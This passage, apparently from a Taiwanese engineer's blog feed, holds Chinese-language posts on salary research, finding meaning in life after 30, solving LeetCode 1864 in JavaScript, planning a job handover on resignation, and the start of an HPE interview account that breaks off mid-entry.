參考價格由數字推斷未來可能貢獻，也代表面試可能只有聊天功能。</li></ol><p>有可能是把人當成本、調薪速度相對慢的公司，核薪與調薪應該會是類似的專業技能。</p><h2 id="網路與科技業的薪資整理"><a href="#網路與科技業的薪資整理" class="headerlink" title="網路與科技業的薪資整理"></a>網路與科技業的薪資整理</h2><p>在核薪之前，許多 HR 可能被交代無法配合市場行情，這時候如果依公司規定往往無法拿到合理的薪水，所以了解市場行情會是最重要的一部。</p><p>前陣子網路上有看到一篇<a href="https://www.dcard.tw/f/tech_job/p/238600302">網路與科技業的薪資的相關資訊</a>，以今年 (2022) 和小編過往經驗、認識的同學們的消息上看來，數據還蠻準確的。</p><p>此外也可以透過公開資訊觀測站來蒐集資訊，舉例來說小編這次順手整理 <a href="https://docs.google.com/spreadsheets/d/1-5qRih-WGzxIls_-pBsOfz_xzemUkLzT/edit?usp=sharing&ouid=112808345573242479508&rtpof=true&sd=true">107-109 年非擔任主管職務之全時員工薪資資訊</a> 給大家參考。</p><p>另外社群也可能會辦理普查，有時候稍微關注一下也可以得到相關資訊，提供給各位大大參考。</p><blockquote><p>前端工程師薪資匿名大調查分配圖 2016<br><img src="https://linyencheng.github.io/2021/01/26/thinking-retrospective-me/FrontEndSalary2016.png" width="100%" height="500px"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>30 幾歲之後的人生意義該去哪裡找</title>
      <link href="/2022/01/01/career/career-life-meaning-after-30/"/>
      <url>/2022/01/01/career/career-life-meaning-after-30/</url>
      
        <content type="html"><![CDATA[<p>在開始之前，先給自己一首歌的時間，好好享受音樂，一定要聽喔 🤗</p><iframe width="560" height="315" src="https://www.youtube.com/embed/nGGBia07vac" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><blockquote><p>摸黑往前走的過程中總會害怕、挫折</p></blockquote><p>忘記讀了哪篇文章看過的，在成長的過程中，比較重要的命題會有三個</p><ol><li>認清自我跟世界的關係</li><li>尋找值得全神貫注的領域</li><li>在愛與被愛中漸漸成熟</li></ol><h2 id="認清自我跟世界的關係"><a href="#認清自我跟世界的關係" class="headerlink" title="認清自我跟世界的關係"></a>認清自我跟世界的關係</h2><p>前陣子看到<a href="https://www.managertoday.com.tw/articles/view/64288">在統計調查了 17 國後發現，台灣人的人生意義其實並不從工作裡找</a>。當下覺得有趣馬上就轉發了，此時學弟感慨的表達了下面這一句話。</p><blockquote><p><strong>鬼島跟地獄朝鮮的工作，基本上都在減少身而為人的意義</strong></p></blockquote><p>當下，靠北的我笑了，但笑著笑著卻又悲傷了起來，各位大大是不是也在某些時刻覺得生活怎麼會這麼喘不過氣，太荒謬了！簡直！！！</p><p>那，南韓和台灣在意的是什麼，共同在意的是<strong>物質福祉</strong>、<strong>家庭</strong>，其中台灣更在意的是<strong>社會</strong>而南韓在意<strong>健康</strong>。</p><ul><li><strong>物質福祉</strong>，薪水此時就是某種可衡量的價值，能夠交換物質和福祉</li><li><strong>家庭意義</strong>，在經過原生家庭的影響後，想成為什麼樣子的人</li></ul><blockquote><p><img src="/2022/01/01/career/career-life-meaning-after-30/life-meaning.webp"><br>資料來源：Pew Research Center／吳美欣 製圖</p></blockquote><p>工作，佔了人生中很大一部分，唯有工作值得喜愛，人生也才會更加可愛，怎麼活過一天就怎麼活過一生。</p><ul><li>為什麼要工作?</li><li>工作是為了什麼?</li><li>工作的意義是什麼?</li><li>什麼是好工作?</li><li>錢跟工作有什麼關係?</li><li>經歷、成長、成就感跟工作有什麼關係?</li></ul><p>常常會想說，等我賺了多少錢之後就可以如何如何。那工作七年賺到了小時候想像不到的數字後，究竟如何如何了嗎?</p><blockquote><p><strong>答案是沒有，同時也開始反思，想做的事情為什麼不能直接去做?</strong></p></blockquote><blockquote><p><img src="/2022/01/01/career/career-life-meaning-after-30/wuwenfeng.webp"><br>聽一場喜歡的演唱會，絕對是人生中美好的事情之一</p></blockquote><p>若成長必定是孤獨，在初期總會想方設法的追求個人的成功。</p><p><strong>社會現實</strong>，直到擁有成功後，也才漸漸會有附加的人際關係和成就。</p><p>現實以資源來說粗淺來分是三個項目</p><ul><li><strong>人力</strong>，可以使用的肉體以及可支配的時間</li><li><strong>物力</strong>，也就是大家在意的物質福祉</li><li><strong>財力</strong>，資本主義底下維持人力與物力平衡的一種操作工具</li></ul><p>在成長階段中大致是三個階段</p><ul><li><strong>依賴</strong>，需要靠著他人、社會的支持</li><li><strong>獨立</strong>，能夠在人力、物力、財力上單獨生存</li><li><strong>互賴</strong>，擁有承諾的能力，承諾在家庭、友誼或是生而為人的意義</li></ul><p>而承諾上，只有信守對自己的承諾後才能信守對他人的諾言，是建立在對過去的充分理解後，最終展現對未來責任評估的一個成果。</p><ul><li><strong>知識</strong>，能夠告訴我們做什麼為何做，也就是初期的追求</li><li><strong>技巧</strong>，如何做會更有效率，更容易增加成功率</li><li><strong>意願</strong>，打從內心想做</li></ul><p><strong>關於未來或是人生意義的期待</strong>，我想大多數的人都可以輕易說出不要什麼，像是我不會想要去賣屁股，但要的是什麼?</p><ul><li>想要的是不是具體明確?</li><li>能完成什麼渴望，是想要還是必須?</li></ul><p>未來會是什麼樣的景象，能夠想像?</p><ul><li>實現的機率?</li><li>是否力所能及?</li><li>需要什麼代價?</li><li>可能的阻礙有哪些?</li></ul><blockquote><p><strong>生活應該是那些關於選擇過後，就跟正妹桌面一樣，精選後的才是人生</strong></p></blockquote><ul><li>該補什麼樣的經驗，才有機會去體驗</li><li>該有什麼能力，才有辦法過那樣的生活</li><li>該接觸什麼人，才能開拓視野和更寬闊的想法</li></ul><h2 id="尋找值得全神貫注的領域"><a href="#尋找值得全神貫注的領域" class="headerlink" title="尋找值得全神貫注的領域"></a>尋找值得全神貫注的領域</h2><p>Ikigai 這個概念還是值得推廣的，人生追求的大概就是所愛、擅長、被需要、能賺錢的交集。</p><blockquote><p><img src="/2022/01/01/career/career-life-meaning-after-30/ikigai.webp"><br>圖片來源: <a href="https://www.flickr.com/photos/brf/30840158067">https://www.flickr.com/photos/brf/30840158067</a></p></blockquote><ul><li><strong>成就</strong>，是全心投入展現重複的累積</li><li><strong>成就感</strong>，是達成某個目標進而滿足內在或外在的期許</li></ul><p>之所以常常不滿意、害怕失敗卻又持續過著不太喜歡的生活，根本還是我們不願意付出時間和努力去交換那個可能可以更好的結果。</p><h2 id="在愛與被愛中漸漸成熟"><a href="#在愛與被愛中漸漸成熟" class="headerlink" title="在愛與被愛中漸漸成熟"></a>在愛與被愛中漸漸成熟</h2><p>在成長的過程中，常常會強迫自己去追尋<strong>被滿足或被認同的外在事物</strong>，藉由這些事物來填補內心的空洞，像是金錢、成就、權力、愛情。</p><p>練習用效率的方式訓練自己，學會趨避風險打安全牌，練習各種成功名人的成功路線方案，認為照著做就可以成功，擁有了之後，卻也發現內心空洞依舊。</p><p>這樣的成長方式，我想最終也會發現無法繼續欺騙自己，以<a href="https://94itv.app/vod-play-id-129754-sid-1-nid-26.html">網球王子中的天衣無縫來說，是不是喜歡打網球在本質上才是重要的</a>，就像龍馬的爸爸南次郎也告訴大家其實根本沒有天衣無縫這個絕招也可以說全部人其實都會這招。</p><blockquote><p><strong>或許終其一生追求的那些可能渴望是自己本來就擁有的</strong></p></blockquote><p>也許在新的一年，練習讓生活中碰到的事物都有價值，嘗試感受本質上的美好而非社會價值中的征服、擁有越多越好。</p><p>練習感受和享受快樂或不快樂，選擇和感受終究是自己給的，選擇或許也不存在正確與否，而在於是不是用心選擇。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題到底是在刷什麼</title>
      <link href="/2021/12/11/js-leetcode-1864-Minimum-Number-of-Swaps-to-Make-the-Binary-String-Alternating/"/>
      <url>/2021/12/11/js-leetcode-1864-Minimum-Number-of-Swaps-to-Make-the-Binary-String-Alternating/</url>
      
        <content type="html"><![CDATA[<h2 id="刷題是什麼"><a href="#刷題是什麼" class="headerlink" title="刷題是什麼?"></a>刷題是什麼?</h2><p>軟體工程師在職涯上想要更進一步的過程中，刷題成為了無可避免的體驗，那刷題可以帶給工程師什麼好處?</p><ul><li>快速確認需求結果</li><li>設計邏輯和演算法</li><li>有效運用資料結構</li><li>考慮完整邊界條件</li><li>測試案例處理優化</li></ul><p>實務上，目前工作了六年多快七年，刷題的技能還是沒鍛鍊起來，其實刷題鍛鍊的是靈活度以及創意發想的能力，但在工作領域上大多只是需要熟悉特定領域，解決差異不大的問題然後有穩定的產出。</p><p>刷題對於特定領域的知識並沒有太大的幫助，譬如前端來說還是需要自行補齊三大框架的設計概念和運用方法，後端也是要多看看大公司都是怎麼設計 API 的。</p><ul><li>後端: 可以參考 <a href="https://slack.engineering/how-we-design-our-apis-at-slack/">slack 是怎麼設計 API</a></li><li>前端: 可以參考 <a href="https://linyencheng.github.io/2021/05/07/react-interview-questions/">你了解 React JS 嗎? 15 個 React JS 的面試問題</a></li></ul><h2 id="刷題準備"><a href="#刷題準備" class="headerlink" title="刷題準備"></a>刷題準備</h2><p>刷題之前需要找一個平台或參加解題活動</p><ul><li>Leet Code: 業界常見刷題平台，免費註冊就可以開始解題</li><li><a href="https://adventofcode.com/">Advent of Code</a>: 由一位國外開發者創立每年固定會舉辦的程式挑戰活動，從 12&#x2F;1 開始到聖誕節結束，目前開始參加還來得及還有機會獲得禮物喔</li></ul><h2 id="刷題預備知識"><a href="#刷題預備知識" class="headerlink" title="刷題預備知識"></a>刷題預備知識</h2><p>如果先只求能解題，其實只需要了解很必備的知識即可。</p><ul><li>基本的迴圈、判斷、函式</li><li>資料結構的知識，像是 linked list、stack、queue</li><li>物件用法</li></ul><h2 id="刷題語言"><a href="#刷題語言" class="headerlink" title="刷題語言"></a>刷題語言</h2><p>實際上是屬於解謎遊戲，所以任何語言都能夠進行刷題，挑選自己習慣好上手的就可以了。</p><h2 id="刷題技巧"><a href="#刷題技巧" class="headerlink" title="刷題技巧"></a>刷題技巧</h2><p>由於目標是參加面試並通過，所以在鍛鍊上就是依照面試流程準備和練習即可，通常面試的流程會是</p><ol><li>出題目</li><li>彼此溝通對題目的認知</li><li>提出預期解決的方式</li><li>實作</li><li>驗證</li><li>時間、空間複雜度理解與說明<ul><li>時間複雜度 (Time Complexity): 執行的次數，通常會看最大也就是 Big O</li><li>空間複雜度 (Space Complexity): 變數空間使用量</li></ul></li><li>優化寫法</li></ol><p>開始寫的過程中通常會先用直觀暴力的方法來解決，像我這樣剛開始練習刷題的人可能寫完就謝天了，但以準備面試來說通常面試官會跟你討論時間或是空間運用上有沒有更好的解法。</p><p>通常那些解法如果常常去看解答的話是很快可以說出來跟應用，不過個人是覺得不用為了這個去當考試機器，反而可以透過跟面試官的討論去一起想出來更好的答案，畢竟未來當同事時也是要一起討論解決方案，以我四年前去群暉面試白板題的經驗來說，優化這個環節其實對方都不會刁難，會是以引導的方式一起把解答寫出來。</p><h2 id="Leet-Code-1864-範例解析"><a href="#Leet-Code-1864-範例解析" class="headerlink" title="Leet Code 1864 範例解析"></a>Leet Code 1864 範例解析</h2><p>刷題的流程以 Leet Code 為例，1864 Minimum Number of Swaps to Make the Binary String Alternating 就會看到題目敘述如下:</p><p>Given a binary string s, return the minimum number of character swaps to make it alternating, or -1 if it is impossible.</p><p>The string is called alternating if no two adjacent characters are equal. For example, the strings “010” and “1010” are alternating, while the string “0100” is not.</p><p>Any two characters may be swapped, even if they are not adjacent.</p><p>理解題目:</p><p>1864 這題，題目的意思是要我們計算最少的交換次數，讓一個字串可以變成 0 跟 1 交叉。如果是面試的情境，可以問看看對方是否題目都是確定一定能夠排成交叉的情況，如果 0 跟 1 的個數不剛好怎麼處理?</p><p>解決方式跟步驟:</p><ol><li>計算 0 跟 1 的個數，看最終會是 0 開頭或是 1 開頭或是都可以</li><li>計算 10、01、00、11 的個數</li><li>統計 10、01 的交換次數</li><li>統計 00、11 的交換次數</li></ol><p>驗證答案:</p><p>預設的測試案例通常比較少，所以考慮不周全的情況下就會錯誤，所以需要補上測試案例與預期結果。</p><table><thead><tr><th>案例</th><th>次數</th></tr></thead><tbody><tr><td>111000</td><td>1</td></tr><tr><td>010</td><td>0</td></tr><tr><td>1110</td><td>-1</td></tr><tr><td>100</td><td>1</td></tr><tr><td>0010111</td><td>1</td></tr></tbody></table><p>底下就附上這題我的解答，寫的也不是特別好 XD</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> minSwaps = <span class="keyword">function</span> (<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> countMinSwaps = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getStatics</span>(<span class="params">chars</span>) &#123;</span><br><span class="line">    <span class="comment">// 分組</span></span><br><span class="line">    <span class="keyword">let</span> count0 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> count1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> count10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> count01 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> count00 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> count11 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> countSame = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">1</span>; index &lt;= chars.<span class="property">length</span> - <span class="number">1</span>; index += <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> nowPair = <span class="string">`<span class="subst">$&#123;chars[index - <span class="number">1</span>]&#125;</span><span class="subst">$&#123;chars[index]&#125;</span>`</span>;</span><br><span class="line">      <span class="keyword">if</span> (nowPair === <span class="string">&quot;01&quot;</span>) &#123;</span><br><span class="line">        count01 += <span class="number">1</span>;</span><br><span class="line">        count0 += <span class="number">1</span>;</span><br><span class="line">        count1 += <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nowPair === <span class="string">&quot;10&quot;</span>) &#123;</span><br><span class="line">        count10 += <span class="number">1</span>;</span><br><span class="line">        count0 += <span class="number">1</span>;</span><br><span class="line">        count1 += <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nowPair === <span class="string">&quot;00&quot;</span>) &#123;</span><br><span class="line">        count00 += <span class="number">1</span>;</span><br><span class="line">        count0 += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nowPair === <span class="string">&quot;11&quot;</span>) &#123;</span><br><span class="line">        count11 += <span class="number">1</span>;</span><br><span class="line">        count1 += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 奇數沒分組到的補上統計</span></span><br><span class="line">    <span class="keyword">if</span> (chars.<span class="property">length</span> % <span class="number">2</span> === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (chars[chars.<span class="property">length</span> - <span class="number">1</span>] === <span class="string">&quot;0&quot;</span>) count0 += <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (chars[chars.<span class="property">length</span> - <span class="number">1</span>] === <span class="string">&quot;1&quot;</span>) count1 += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    countSame = <span class="title class_">Math</span>.<span class="title function_">max</span>(count00, count11);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chars.<span class="property">length</span> &lt; <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (count0 === <span class="number">2</span> || count1 === <span class="number">2</span>) &#123;</span><br><span class="line">        countMinSwaps = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      count0,</span><br><span class="line">      count1,</span><br><span class="line">      count10,</span><br><span class="line">      count01,</span><br><span class="line">      countSame,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> chars = s.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> &#123; count0, count1, count10, count01, countSame &#125; = <span class="title function_">getStatics</span>(chars);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    count0 - count1 !== <span class="number">0</span> &amp;&amp;</span><br><span class="line">    count0 - count1 !== <span class="number">1</span> &amp;&amp;</span><br><span class="line">    count0 - count1 !== -<span class="number">1</span></span><br><span class="line">  ) &#123;</span><br><span class="line">    countMinSwaps = -<span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (</span><br><span class="line">    chars[<span class="number">0</span>] === chars[chars.<span class="property">length</span> - <span class="number">1</span>] ||</span><br><span class="line">    (chars.<span class="property">length</span> &gt;= <span class="number">4</span> &amp;&amp; chars[<span class="number">0</span>] !== chars[chars.<span class="property">length</span> - <span class="number">1</span>])</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (count0 === count1) &#123;</span><br><span class="line">      countMinSwaps = <span class="title class_">Math</span>.<span class="title function_">min</span>(count10, count01) + countSame;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (count0 &gt; count1) &#123;</span><br><span class="line">      countMinSwaps = count10 + countSame;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      countMinSwaps = count01 + countSame;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> countMinSwaps;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">  <span class="title function_">minSwaps</span>(</span><br><span class="line">    <span class="string">&quot;11110100110010101011100100101011111101101001101100100011011100000010100101011011101100011111010101011011010011001010110111011001001110101100110100110001001010111001110101011001101110100100000100000101000101101001101011010000010000010011011001010101110001011001011001010110101001010111100100110100110000100101111000101001101101100001011011001100000010001101101000010100100011101110010111111&quot;</span></span><br><span class="line">  )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Frontend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>離職交接計畫</title>
      <link href="/2021/12/01/career-resign-and-job-handover/"/>
      <url>/2021/12/01/career-resign-and-job-handover/</url>
      
        <content type="html"><![CDATA[<p>離職最重要的事就是對自己的職涯負責，交接是雙方要一起跟專案走到哪裡，著重在接下來 PM 的專案管理和 RD 接手執行難易的程度。</p><h2 id="談離職"><a href="#談離職" class="headerlink" title="談離職"></a>談離職</h2><p>談離職除了心態上大致上會有三個過程</p><ol><li>離職前</li><li>離職準備</li><li>工作交接</li></ol><h3 id="心態準備"><a href="#心態準備" class="headerlink" title="心態準備"></a>心態準備</h3><p>公司成長整體來看會是平均值，對個體來說成長的速度超過平均再正常不過，所以隨時面試和思考何時離職就是一個對自己職涯負責的方式。</p><p>能跟有能力的同事共事需要幸運，主管並不是阻礙我們離職的人，應該是職涯往前進步的助力。</p><p>交接心態上分成三點</p><ol><li>交接意識</li><li>認知落差</li><li>立場和回饋</li></ol><blockquote><p>重要的是要有共識，這樣前進的時候方向才會一致。</p></blockquote><h4 id="交接意識"><a href="#交接意識" class="headerlink" title="交接意識"></a>交接意識</h4><p>最重要的是有意識這件事，必須意識到在未來的某個時刻，任務就會交給你進行，對需要接手的人來說，就是需要創造這樣的意識。</p><p>對爬山來說，根據天候、路程、體力要做哪些準備。</p><p>對專案來說:</p><ul><li>目前遇到了什麼問題</li><li>狀態覺察，理解現在位置在哪裡，處在什麼樣的狀態</li></ul><h4 id="認知落差"><a href="#認知落差" class="headerlink" title="認知落差"></a>認知落差</h4><p>資訊上的落差 &#x3D;&gt; 認知差異</p><ul><li>未來的走向是誰決定，接下來的策略走向和計畫?</li><li>為什麼會有這樣的功能?</li></ul><p>知識上的落差 &#x3D;&gt; 理解問題</p><ul><li>規格、需求、其他文件資源</li><li>開發、測試、跨部門合作流程上了解</li></ul><p>經驗上的落差 &#x3D;&gt; 吸收和上手速度</p><ul><li>整理 FAQ 文件</li><li>提早把部分工作內容少量多次交給相關同事</li><li>工作能力與基礎知識不同，會有吸收速度上的落差</li></ul><p>關鍵人物理解的落差 &#x3D;&gt; 溝通成本</p><ul><li>會不會找不到流程中常常需要接觸的人</li><li>會不會找不到出問題可以問的人</li></ul><h4 id="立場和回饋"><a href="#立場和回饋" class="headerlink" title="立場和回饋"></a>立場和回饋</h4><ul><li>沒辦法用叫的讓人家怎麼做，只能讓大家知道該怎麼做，最後自己願意去做</li><li>交接跟減重一樣只有一種方法有效，只有你願意堅持的那一種</li><li>不知道自己不知道，可是也不會有人知道你不知道</li><li>沒有人應該主動替你著想或是教會你職場上該會的事情</li></ul><h3 id="離職前"><a href="#離職前" class="headerlink" title="離職前"></a>離職前</h3><p>離職前讓老闆理解你的職涯發展狀況，一開始就堂堂正正講真的理由。該好好反覆問自己是否在原來的公司沒有辦法得到任何的改善和進步了?</p><ol><li>確認自己的計劃，反覆檢視是否需要離職</li><li>提早和同事們、老闆聊聊可能會有想要異動的原因</li><li>成長的速度是否被公司環境影響而變慢了</li></ol><p>離職會造成老闆的困擾會有幾個部分</p><ol><li>員工 C&#x2F;P 值太高</li><li>接替的下一位難找</li><li>訓練的時間成本</li></ol><h3 id="離職準備"><a href="#離職準備" class="headerlink" title="離職準備"></a>離職準備</h3><p>決定要離開之後就提早做好相關準備，怎麼做交接就會怎麼留下自己在公司的印象。</p><p>越提早公開相關訊息，交接的時候就可以避免平常上班在逛網拍或是患有阿茲罕默症的同事打擾?</p><p>大家過往在學校、職場都會遇到雷包隊友，讓透明度全開就可以讓目前專案或是團隊問題有機會顯化，相關公開訊息也可以在操作過程中留下紀錄。</p><p>只要把事實攤開來，當大老闆或主管知道後，有眼睛的人其實都會知道問題在哪裡。</p><ul><li>最好的狀況是文件交付後，有問題再協助接任者 &#x3D;&gt; 給對方需要的，對方才會感謝你</li><li>提早讓各種問題透明且交代清楚 &#x3D;&gt; 有事沒事就寄信、發群組訊息，留下真實的記錄與證據</li><li>照三餐分享工作進度 &#x3D;&gt; 讓全部有關的人都知道你在做什麼</li></ul><p>讓主管和同事知道:</p><ul><li>為什麼你會選擇離職，而你又做了哪些努力</li><li>預告接下來的新人會怎麼死，至少知道哪裏有坑，能事先預防或繞路</li></ul><h3 id="工作交接"><a href="#工作交接" class="headerlink" title="工作交接"></a>工作交接</h3><p>軟體專案操作上有三個重點:</p><ol><li>地圖全開: 不管懂或不懂都讓事實全貌呈現</li><li>寄信溝通: 副本給想打擾的主管，不然就換主管打擾你</li><li>實體交接: 好壞都要開會，相關主管務必在場</li></ol><h4 id="地圖全開"><a href="#地圖全開" class="headerlink" title="地圖全開"></a>地圖全開</h4><p>這段時間的工作不是去理解，而是探索事實的全貌，就像玩世紀帝國遊戲剛開始會在初始建設後就使用速度最快的輕騎兵先把整個地圖跑過一遍，快速確認資源、敵方狀態和相對位置。</p><p>工作交接上:</p><ol><li>用最快的速度看完專案全貌</li><li>了解對方狀態、資源</li><li>專案目前相對於短期目標完成所在的位置和未來發展的方向</li></ol><h4 id="寄信溝通"><a href="#寄信溝通" class="headerlink" title="寄信溝通"></a>寄信溝通</h4><p>心虛的人通常不敢寄信，但建議還是留下證據，有雷被挖坑沒關係，但不需要讓未來整個團隊來背鍋，是之前的問題就該在離開前被顯示出來。</p><blockquote><p>殷素素：「記住，別相信女人，越漂亮的女人越會騙人。」<br>不可考：「寧可相信世上有鬼，也不要相信男人那張嘴。」</p></blockquote><p>寄信的好處有三點</p><ol><li>等交接時也可以原封不動將相關紀錄再交接</li><li>留下相關溝通紀錄，職場上推責任是必備技能，寄信是保護自己也保護部門</li><li>較方便將訊息同步給忙碌的高層主管，以前爛專案副本最高有給到副總</li></ol><h4 id="實體交接"><a href="#實體交接" class="headerlink" title="實體交接"></a>實體交接</h4><p>通常按照文件還是有機會跑不起來，實體的示範就相對重要。趁此機會對齊知識、文件、資源上的落差，像是如果步驟有少、檔案有少就需要快點請對方提供。</p><p>如果交接到有專案爛掉的情況，就在公開場合告知大家，並請示主管該如何處理，當然不期待可以修好，但至少讓對方協助在相關的位置補上註解，補註解就比較不會有時間不夠的藉口。</p><p>其他形式的交接就自己寫文件請對方確認或是請對方協助補相關說明。</p><h2 id="交接鬼故事"><a href="#交接鬼故事" class="headerlink" title="交接鬼故事"></a>交接鬼故事</h2><p>工作這麼多年來，也交接 10 幾個專案跟不少同事交手過，底下簡單分享幾個鬼故事 XD</p><ol><li><p>交接專案檔案有少給的情況，當然可能不小心沒有進版控或是認為這個檔案不需要進版控，所以不要天真單純的以為線上可以跑就可以跑了。</p></li><li><p>遇過專案會記憶體洩漏，由於伺服器都 32G+ 在使用上並不會頻繁出現，經主管提醒用 8G 測試機開一整天測試才發現問題。</p></li><li><p>網頁在特定時段只要開著就會壞掉，這真的要感謝主管提醒，透過掛機也才能發現問題，不然得到說法是 QC 測過沒問題了。</p></li><li><p>同事背後被幾個部門抱怨仍沒優化做法，但可能沒有過受適當訓練無法解決問題，正常幾天做好的事拖到兩週至一個月，只剩抱怨前任很爛的功能。</p></li><li><p>沒有任何交接文件，詢問主管時只說人還在直接問就好了。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HPE Full Stack Web Developer 面試心得 (2021/08)</title>
      <link href="/2021/11/16/career-interview-with-international-company/"/>
      <url>/2021/11/16/career-interview-with-international-company/</url>
      
        <content type="html"><![CDATA[<p>2021&#x2F;8 第一次參加了 HPE 完整面試流程，職缺是上海 HR 主動聯絡的 Full-Stack 工程師</p><ul><li>加入後會以前端為主</li><li>後端主要是 Python</li><li>工作內容主要是以實作 HPE 內部的系統為主</li><li>會使用內部機房沒有使用雲端</li><li>工作型態為全遠端</li></ul><p>在面試的流程中會遇到三個 HR，兩位在上海一位在台灣，面試過程主要分成下面七次互動</p><ol><li>HR 電話面試: 上海 HR 英文問技術問題中文回答，感覺防呆而已</li><li>HR 電話聊天: 台灣 HR 提醒怎麼準備面試，順便打聽身家跟請我把履歷上的學校補起來之類的</li><li>技術面試: 線上面試考兩題 LeetCode 跟兩個工程師邊寫邊聊天<ul><li>Online coding test</li><li>Data structure (time&#x2F;space complexity)</li></ul></li><li>行為面試: People Manager 問很多個性類問題，遇到挫折怎麼處理之類的</li><li>HR 電話聊天: HR 第二次關心，請我修飾一下針對事情的描述方式，提醒薪水不要開太低</li><li>團隊合作: Meeting with Product Owner and QA lead</li><li>系統設計: Domain knowledge &amp; system design，系統設計觀念類聊天</li></ol><h2 id="HR-電話面試"><a href="#HR-電話面試" class="headerlink" title="HR 電話面試"></a>HR 電話面試</h2><ol><li>第一個會是 HPE 